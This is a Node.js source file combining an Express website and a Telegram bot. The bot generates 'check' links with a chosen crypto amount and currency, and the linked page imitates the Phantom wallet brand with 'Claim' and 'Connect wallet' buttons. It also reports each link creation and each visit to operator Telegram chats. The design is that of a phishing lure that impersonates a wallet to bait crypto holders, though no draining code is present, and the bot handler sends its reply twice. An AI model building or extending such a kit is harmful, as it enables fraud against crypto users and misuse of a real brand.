import "dotenv/config";
import express from "express";
import { Telegraf, Markup } from "telegraf";

const bot = new Telegraf(process.env.BOT_TOKEN);
// userId -> array of links (strings)
const linksByUser = new Map();
const linkStore = new Map(); // id -> { uid, amount, currency, createdAt }

function makeId() {
  return Math.random().toString(36).slice(2, 10); // like "k3f9x2ab"
}

// IMPORTANT: set this in Render ENV to your real URL, like:
// https://greenland-2w80.onrender.com
const BASE_URL = process.env.BASE_URL || "http://localhost:3000";

const PORT = process.env.PORT || 3000;

// =====================
// WEBSITE
// =====================
const app = express();

function safeText(v) {
  // very simple safety for text output
  return String(v ?? "").replace(/[<>]/g, "");
}

function formatAmount(amountRaw) {
  const n = Number(amountRaw);
  if (!Number.isFinite(n)) return safeText(amountRaw);
  // 1840 -> 1,840
  return new Intl.NumberFormat("en-US", { maximumFractionDigits: 8 }).format(n);
}

function currencyDisplay(currencyRaw) {
  const c = String(currencyRaw || "").toLowerCase();
  if (c === "usdt" || c === "usdc") return { label: c.toUpperCase(), suffix: "$" };
  if (c === "sol") return { label: "SOL", suffix: " SOL" };
  return { label: safeText(currencyRaw).toUpperCase(), suffix: "" };
}

app.get("/", (req, res) => {
  res.setHeader("content-type", "text/html; charset=utf-8");
  res.send(`
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Greenland</title>
  <style>
    :root{
      --bg:#f4f1ff;
      --text:#241c3a;
      --muted:#6c6390;
      --card:#ffffffcc;
      --stroke:#e7e2ff;
      --pill:#ffffffb8;
      --accent:#8f7cff;
      --accent2:#b7a9ff;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      background: radial-gradient(1000px 500px at 50% -10%, #ffffff 0%, var(--bg) 60%);
      color:var(--text);
    }
    .wrap{max-width:1100px;margin:0 auto;padding:18px 20px}
    .nav{
      display:flex;align-items:center;gap:14px;
    }
    .brand{
      display:flex;align-items:center;gap:10px;
      font-weight:800;letter-spacing:-0.02em;
    }
    .brand .logo{
      width:34px;height:34px;border-radius:12px;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
      display:grid;place-items:center;
      box-shadow: 0 10px 30px rgba(143,124,255,.25);
    }
    .brand span{font-size:18px}
    .menuPill{
      margin:0 auto;
      display:flex;gap:22px;align-items:center;
      padding:12px 18px;
      border:1px solid var(--stroke);
      border-radius:999px;
      background:var(--pill);
      backdrop-filter: blur(10px);
    }
    .menuPill a{
      text-decoration:none;
      color:var(--text);
      font-weight:600;
      font-size:14px;
      opacity:.9;
    }
    .right{
      display:flex;align-items:center;gap:10px;
    }
    .iconBtn{
      width:38px;height:38px;border-radius:999px;
      border:1px solid var(--stroke);
      background:var(--pill);
      display:grid;place-items:center;
      cursor:pointer;
    }
    .downloadBtn{
      padding:10px 16px;border-radius:999px;
      border:1px solid rgba(143,124,255,.25);
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
      color:white;font-weight:800;
      cursor:pointer;
      box-shadow: 0 14px 40px rgba(143,124,255,.25);
    }

    .hero{
      padding:80px 0 50px;
      text-align:center;
    }
    .tag{
      color:var(--muted);
      font-weight:700;
      letter-spacing:-0.01em;
    }
    .headline{
      margin:22px auto 10px;
      font-weight:900;
      letter-spacing:-0.04em;
      line-height:0.95;
      font-size: clamp(54px, 7vw, 92px);
    }
    .ghost{
      display:inline-block;
      vertical-align:middle;
      margin:0 12px;
      transform: translateY(-6px);
    }
    .amount{
      font-size: clamp(50px, 6vw, 84px);
      font-weight:900;
      letter-spacing:-0.03em;
      margin-top:10px;
    }
    .ctaWrap{
      margin-top:34px;
      display:flex;
      justify-content:center;
    }
    .cta{
      display:flex;align-items:center;gap:10px;
      padding:14px 20px;
      border-radius:999px;
      border:1px solid var(--stroke);
      background:rgba(255,255,255,.75);
      backdrop-filter: blur(10px);
      font-weight:800;
      cursor:pointer;
      box-shadow: 0 18px 60px rgba(0,0,0,.06);
    }
    .phone{
      width:18px;height:18px;opacity:.85;
    }
    .sub{
      margin-top:14px;
      color:var(--muted);
      font-weight:600;
      font-size:14px;
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="nav">
      <div class="brand">
        <div class="logo" aria-hidden="true">
          <!-- tiny ghost -->
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M12 3c-4.4 0-8 3.6-8 8v8.5c0 .7.7 1.2 1.4.9l2.2-1.1c.3-.2.7-.2 1 0l2.2 1.1c.3.2.7.2 1 0l2.2-1.1c.3-.2.7-.2 1 0l2.2 1.1c.7.3 1.4-.2 1.4-.9V11c0-4.4-3.6-8-8-8Z" fill="white" opacity="0.95"/>
            <circle cx="9.5" cy="11" r="1.2" fill="#6b5cff"/>
            <circle cx="14.5" cy="11" r="1.2" fill="#6b5cff"/>
          </svg>
        </div>
        <span>phantom</span>
      </div>

      <div class="menuPill">
        <a href="#">Features</a>
        <a href="#">Learn</a>
        <a href="#">Explore</a>
        <a href="#">Company</a>
        <a href="#">Developers</a>
        <a href="#">Support</a>
      </div>

      <div class="right">
        <button class="iconBtn" title="Search" aria-label="Search">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M10.5 18a7.5 7.5 0 1 1 0-15 7.5 7.5 0 0 1 0 15Z" stroke="#241c3a" stroke-width="2"/>
            <path d="M16.5 16.5 21 21" stroke="#241c3a" stroke-width="2" stroke-linecap="round"/>
          </svg>
        </button>
        <button class="downloadBtn">Conncet wallet</button>
      </div>
    </div>

    <div class="hero">
      <div class="tag">The crypto app for everyone</div>
      <div class="headline">
        Your
        <span class="ghost" aria-hidden="true">
          <svg width="90" height="90" viewBox="0 0 120 120" fill="none">
            <path d="M60 14c-21 0-38 17-38 38v39c0 5 5 9 10 7l10-5c2-1 5-1 7 0l10 5c2 1 5 1 7 0l10-5c2-1 5-1 7 0l10 5c5 2 10-2 10-7V52c0-21-17-38-38-38Z" fill="url(#g)"/>
            <circle cx="48" cy="58" r="7" fill="#ffffff" opacity="0.95"/>
            <circle cx="75" cy="58" r="7" fill="#ffffff" opacity="0.95"/>
            <path d="M46 60c2 4 6 6 10 6" stroke="#ffffff" stroke-width="6" stroke-linecap="round" opacity="0.85"/>
            <defs>
              <linearGradient id="g" x1="30" y1="25" x2="95" y2="105" gradientUnits="userSpaceOnUse">
                <stop stop-color="#8f7cff"/>
                <stop offset="1" stop-color="#b7a9ff"/>
              </linearGradient>
            </defs>
          </svg>
        </span>
        check
      </div>

      <div class="sub">Open /check?amount=123&currency=usdt to test</div>
    </div>
  </div>
</body>
</html>
  `);
});

app.get("/check", async (req, res) => {
  const amountRaw = req.query.amount;
  const currencyRaw = req.query.currency;

  const amount = formatAmount(amountRaw);
  const { label, suffix } = currencyDisplay(currencyRaw);

  res.setHeader("content-type", "text/html; charset=utf-8");
  // LOG: link opened
try {
  const amount = req.query.amount;
  const currency = req.query.currency;

  if (process.env.OPEN_LOG_CHAT_ID) {
    await bot.telegram.sendMessage(
      process.env.OPEN_LOG_CHAT_ID,
      `👀 LINK OPENED\nAmount: ${amount}\nCurrency: ${(currency || "").toUpperCase()}\nURL: ${req.originalUrl}`
    );
  }
} catch (e) {
  console.log("OPEN LOG ERROR:", e?.message || e);
}

  res.send(`
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Your check</title>
  <style>
    :root{
      --bg:#f4f1ff;
      --text:#241c3a;
      --muted:#6c6390;
      --stroke:#e7e2ff;
      --pill:#ffffffb8;
      --accent:#8f7cff;
      --accent2:#b7a9ff;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      background: radial-gradient(1000px 500px at 50% -10%, #ffffff 0%, var(--bg) 60%);
      color:var(--text);
    }
    .wrap{max-width:1100px;margin:0 auto;padding:18px 20px}
    .nav{display:flex;align-items:center;gap:14px}
    .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:-0.02em}
    .brand .logo{
      width:34px;height:34px;border-radius:12px;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
      display:grid;place-items:center;
      box-shadow: 0 10px 30px rgba(143,124,255,.25);
    }
    .menuPill{
      margin:0 auto;
      display:flex;gap:22px;align-items:center;
      padding:12px 18px;border:1px solid var(--stroke);
      border-radius:999px;background:var(--pill);
      backdrop-filter: blur(10px);
    }
    .menuPill a{color:var(--text);text-decoration:none;font-weight:600;font-size:14px;opacity:.9}
    .right{display:flex;align-items:center;gap:10px}
    .iconBtn{
      width:38px;height:38px;border-radius:999px;border:1px solid var(--stroke);
      background:var(--pill);display:grid;place-items:center;cursor:pointer;
    }
    .downloadBtn{
      padding:10px 16px;border-radius:999px;border:1px solid rgba(143,124,255,.25);
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
      color:white;font-weight:800;cursor:pointer;
      box-shadow: 0 14px 40px rgba(143,124,255,.25);
    }

    .hero{padding:90px 0 70px;text-align:center}
    .tag{color:var(--muted);font-weight:700}
    .headline{
      margin:22px auto 10px;
      font-weight:900;letter-spacing:-0.04em;line-height:0.95;
      font-size: clamp(54px, 7vw, 92px);
    }
    .ghost{display:inline-block;vertical-align:middle;margin:0 12px;transform: translateY(-6px)}
    .amount{
      font-size: clamp(54px, 6.5vw, 90px);
      font-weight:900;letter-spacing:-0.03em;margin-top:10px;
    }
    .badge{
      display:inline-flex;align-items:center;gap:8px;
      padding:8px 12px;border-radius:999px;
      border:1px solid var(--stroke);
      background:rgba(255,255,255,.65);
      font-weight:800;font-size:13px;color:var(--muted);
      margin-top:18px;
    }
    .dot{width:8px;height:8px;border-radius:99px;background:linear-gradient(135deg,var(--accent),var(--accent2))}
    .ctaWrap{margin-top:34px;display:flex;justify-content:center}
    .cta{
      display:flex;align-items:center;gap:10px;
      padding:14px 20px;border-radius:999px;
      border:1px solid var(--stroke);
      background:rgba(255,255,255,.75);
      backdrop-filter: blur(10px);
      font-weight:800;cursor:pointer;
      box-shadow: 0 18px 60px rgba(0,0,0,.06);
    }
    .phone{width:18px;height:18px;opacity:.85}
    .small{margin-top:14px;color:var(--muted);font-weight:600;font-size:14px}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="nav">
      <div class="brand">
        <div class="logo" aria-hidden="true">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M12 3c-4.4 0-8 3.6-8 8v8.5c0 .7.7 1.2 1.4.9l2.2-1.1c.3-.2.7-.2 1 0l2.2 1.1c.3.2.7.2 1 0l2.2-1.1c.3-.2.7-.2 1 0l2.2 1.1c.7.3 1.4-.2 1.4-.9V11c0-4.4-3.6-8-8-8Z" fill="white" opacity="0.95"/>
            <circle cx="9.5" cy="11" r="1.2" fill="#6b5cff"/>
            <circle cx="14.5" cy="11" r="1.2" fill="#6b5cff"/>
          </svg>
        </div>
        <span>phantom</span>
      </div>

      <div class="menuPill">
        <a href="#">Features</a>
        <a href="#">Learn</a>
        <a href="#">Explore</a>
        <a href="#">Company</a>
        <a href="#">Developers</a>
        <a href="#">Support</a>
      </div>

      <div class="right">
        <button class="iconBtn" title="Search" aria-label="Search">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M10.5 18a7.5 7.5 0 1 1 0-15 7.5 7.5 0 0 1 0 15Z" stroke="#241c3a" stroke-width="2"/>
            <path d="M16.5 16.5 21 21" stroke="#241c3a" stroke-width="2" stroke-linecap="round"/>
          </svg>
        </button>
        <button class="downloadBtn">Download</button>
      </div>
    </div>

    <div class="hero">
      <div class="tag">The crypto app for everyone</div>

      <div class="headline">
        Your
        <span class="ghost" aria-hidden="true">
          <svg width="90" height="90" viewBox="0 0 120 120" fill="none">
            <path d="M60 14c-21 0-38 17-38 38v39c0 5 5 9 10 7l10-5c2-1 5-1 7 0l10 5c2 1 5 1 7 0l10-5c2-1 5-1 7 0l10 5c5 2 10-2 10-7V52c0-21-17-38-38-38Z" fill="url(#g)"/>
            <circle cx="48" cy="58" r="7" fill="#ffffff" opacity="0.95"/>
            <circle cx="75" cy="58" r="7" fill="#ffffff" opacity="0.95"/>
            <path d="M46 60c2 4 6 6 10 6" stroke="#ffffff" stroke-width="6" stroke-linecap="round" opacity="0.85"/>
            <defs>
              <linearGradient id="g" x1="30" y1="25" x2="95" y2="105" gradientUnits="userSpaceOnUse">
                <stop stop-color="#8f7cff"/>
                <stop offset="1" stop-color="#b7a9ff"/>
              </linearGradient>
            </defs>
          </svg>
        </span>
        check
      </div>

      <div class="amount">${amount}${safeText(suffix)}</div>

      <div class="badge"><span class="dot"></span> Currency: ${safeText(label)}</div>

      <div class="ctaWrap">
        <button class="cta" onclick="alert('This button is just UI for now ✅')">
          <svg class="phone" viewBox="0 0 24 24" fill="none">
            <path d="M8 4h8a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2Z" stroke="#241c3a" stroke-width="2"/>
            <path d="M10 18h4" stroke="#241c3a" stroke-width="2" stroke-linecap="round"/>
          </svg>
          Claim
        </button>
      </div>

      <div class="small">How it works?</div>
    </div>
  </div>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log("Website running on port:", PORT);
});

// =====================
// TELEGRAM BOT
// =====================
const pendingAmount = new Map();

function isValidAmount(text) {
  return /^(\d+)(\.\d+)?$/.test(text) && Number(text) > 0;
}

function buildLink(amount, currency) {
  const url = new URL(`${BASE_URL}/check`);
  url.searchParams.set("amount", amount);
  url.searchParams.set("currency", currency);
  return url.toString();
}

bot.start(async (ctx) => {
  pendingAmount.delete(ctx.from.id);
  await ctx.reply("Send amount (number). Example: 12.5");
});

bot.on("text", async (ctx) => {
  const text = ctx.message.text.trim();
  if (text.startsWith("/")) return;

  if (!isValidAmount(text)) {
    return ctx.reply("❌ Invalid number. Send like: 10 or 10.5");
  }

  pendingAmount.set(ctx.from.id, text);

  return ctx.reply(
    "Choose currency:",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("USDT", "CUR:usdt"),
        Markup.button.callback("USDC", "CUR:usdc"),
        Markup.button.callback("SOL", "CUR:sol"),
      ],
    ])
  );
});

bot.action(/^CUR:(usdt|usdc|sol)$/, async (ctx) => {
  const currency = ctx.match[1];
  const amount = pendingAmount.get(ctx.from.id);

  if (!amount) {
    await ctx.answerCbQuery();
    return ctx.reply("Amount not found. Send the amount again.");
  }

  // 1️⃣ build link BASE (existing)
const uid = ctx.from.id;

// 2️⃣ REPLACE buildLink usage with this
const url = new URL(`${BASE_URL}/check`);
url.searchParams.set("amount", amount);
url.searchParams.set("currency", currency);
url.searchParams.set("uid", String(uid));
const link = url.toString();

// 3️⃣ SAVE link for profile (NEW)
if (!linksByUser.has(uid)) linksByUser.set(uid, []);
linksByUser.get(uid).unshift(link);

// 4️⃣ send link to user (existing)
await ctx.answerCbQuery("Done ✅");
await ctx.reply(`Here’s your link:\n${link}`);

// 5️⃣ LOG: link created (existing logs code)


  await ctx.answerCbQuery("Done ✅");
  await ctx.reply(`Here’s your link:\n${link}`);
// LOG: link created
try {
  if (process.env.CREATE_LOG_CHAT_ID) {
    await bot.telegram.sendMessage(
      process.env.CREATE_LOG_CHAT_ID,
      `🆕 LINK CREATED\nUser: ${ctx.from.username ? "@" + ctx.from.username : (ctx.from.first_name || "unknown") + " (no username)"} | id: ${ctx.from.id}
\nAmount: ${amount}\nCurrency: ${currency.toUpperCase()}\nLink: ${link}`
    );
  }
} catch (e) {
  console.log("CREATE LOG ERROR:", e?.message || e);
}

  pendingAmount.delete(ctx.from.id);
});

bot.launch();
console.log("Bot is running ✅");
